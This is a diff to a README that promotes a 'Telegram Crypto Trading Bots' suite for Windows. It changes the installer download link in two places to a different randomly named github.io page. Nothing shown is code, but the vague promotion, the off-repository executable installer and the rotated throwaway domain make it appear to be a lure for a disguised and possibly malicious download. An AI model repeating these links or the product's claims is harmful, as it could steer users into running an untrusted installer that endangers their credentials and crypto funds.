@@ -2,7 +2,7 @@
 
 Welcome to the Telegram Crypto Trading Bots suite, your all-in-one solution for automated crypto trading. This advanced toolset allows you to manage and execute trades directly from Telegram, supporting multiple exchanges and strategies. Last updated in 2026, it ensures cutting-edge features and reliability for Windows desktop users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -70,6 +70,6 @@ This tool is intended for educational and personal use only. Cryptocurrency trad
 
 For the latest version of the Telegram Crypto Trading Bots suite, download it here:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 © 2026 Telegram Crypto Trading Bots Team. All rights reserved.
